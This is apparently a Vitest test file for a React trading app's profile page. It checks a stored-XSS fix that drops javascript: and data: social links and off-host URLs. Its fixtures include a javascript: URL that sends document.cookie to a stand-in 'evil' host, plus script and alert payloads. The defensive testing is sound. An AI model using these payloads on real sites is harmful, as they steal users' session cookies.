import React from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { act } from 'react-dom/test-utils'
import { MemoryRouter, Route, Routes } from 'react-router-dom'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { Trader } from '../types'

// FE-01 (stored XSS): leader social links come straight from the API
// (`POST /social/leaders/profile` accepts any zod `url()`, including
// `javascript:`). The profile page must render only https links on the
// expected hosts, with rel="noopener noreferrer". Mocked boundaries only:
// wallet SDK, toasts, social API, copy modal, chart.

const mocks = vi.hoisted(() => ({
  getLeaderProfile: vi.fn(),
  getLeaderFollowers: vi.fn()
}))

vi.mock('../../../context/SDKContext', () => ({
  useSDK: () => ({ walletAddress: null, signMessage: vi.fn() })
}))
vi.mock('../../../components/feedback/ToastProvider', () => ({
  useToast: () => ({ toast: vi.fn() })
}))
vi.mock('../../../services/socialService', () => ({
  default: {
    getLeaderProfile: mocks.getLeaderProfile,
    getLeaderFollowers: mocks.getLeaderFollowers,
    followLeader: vi.fn(),
    unfollowLeader: vi.fn()
  },
  buildFollowLeaderMessage: vi.fn(),
  buildUnfollowLeaderMessage: vi.fn(),
  createSignedActionMetadata: vi.fn()
}))
vi.mock('../../copytrade/CopyModal', () => ({ default: () => null }))
vi.mock('./PnLChart', () => ({ default: () => null }))
vi.mock('./IdeaItem', () => ({ default: () => null }))
vi.mock('pages/header/modals/wallets', () => ({
  requestWalletConnect: vi.fn()
}))

import Profile from './index'

const trader = (socialLinks: Trader['socialLinks'], avatar = ''): Trader => ({
  id: 'leader-1',
  name: 'Mallory',
  username: 'mallory',
  address: '5Fake',
  avatar,
  isAI: false,
  isVerified: false,
  bio: '',
  memberSince: '',
  roi30d: 0,
  roi90d: 0,
  aum: '0',
  drawdown: 0,
  followers: 0,
  winRate: 0,
  avgProfit: 0,
  sharpe: 0,
  fee: 10,
  pnlHistory: [],
  trades: [],
  ideas: [],
  tags: [],
  socialLinks
})

let container: HTMLDivElement
let root: Root

const renderProfile = async (t: Trader) => {
  mocks.getLeaderProfile.mockResolvedValue(t)
  mocks.getLeaderFollowers.mockResolvedValue([])
  await act(async () => {
    root.render(
      <MemoryRouter initialEntries={['/social/profile/leader-1']}>
        <Routes>
          <Route path="/social/profile/:id" element={<Profile />} />
        </Routes>
      </MemoryRouter>
    )
  })
  // flush the profile fetch
  await act(async () => {
    await Promise.resolve()
  })
}

const link = (label: string) =>
  Array.from(container.querySelectorAll('a')).find(a =>
    a.textContent?.includes(label)
  )

beforeEach(() => {
  ;(globalThis as Record<string, unknown>).IS_REACT_ACT_ENVIRONMENT = true
  container = document.createElement('div')
  document.body.appendChild(container)
  root = createRoot(container)
})

afterEach(() => {
  act(() => root.unmount())
  container.remove()
})

describe('Profile social links (FE-01)', () => {
  it('drops javascript:/data: and off-host links', async () => {
    await renderProfile(
      trader({
        twitterUrl:
          "javascript:fetch('https://evil/x?'+btoa(document.cookie))//",
        telegramUrl: 'data:text/html,<script>alert(1)</script>',
        discordUrl: 'https://evil.example/discord.gg'
      })
    )
    expect(container.textContent).toContain('Mallory')
    expect(link('X / Twitter')).toBeUndefined()
    expect(link('Telegram')).toBeUndefined()
    expect(link('Discord')).toBeUndefined()
    for (const a of Array.from(container.querySelectorAll('a'))) {
      expect(a.getAttribute('href') ?? '').not.toMatch(
        /^\s*(javascript|data):/i
      )
    }
  })

  it('renders valid https links with an isolated opener', async () => {
    await renderProfile(
      trader({
        twitterUrl: 'https://x.com/mallory',
        telegramUrl: 'https://t.me/mallory',
        discordUrl: 'https://discord.gg/abc'
      })
    )
    const tw = link('X / Twitter')
    expect(tw?.getAttribute('href')).toBe('https://x.com/mallory')
    expect(tw?.getAttribute('target')).toBe('_blank')
    expect(tw?.getAttribute('rel')).toBe('noopener noreferrer')
    expect(link('Telegram')?.getAttribute('href')).toBe('https://t.me/mallory')
    expect(link('Discord')?.getAttribute('href')).toBe('https://discord.gg/abc')
  })

  it('does not render a javascript: avatar as an image', async () => {
    await renderProfile(trader({}, 'javascript:alert(1)'))
    expect(container.querySelector('img[src^="javascript"]')).toBeNull()
  })
})
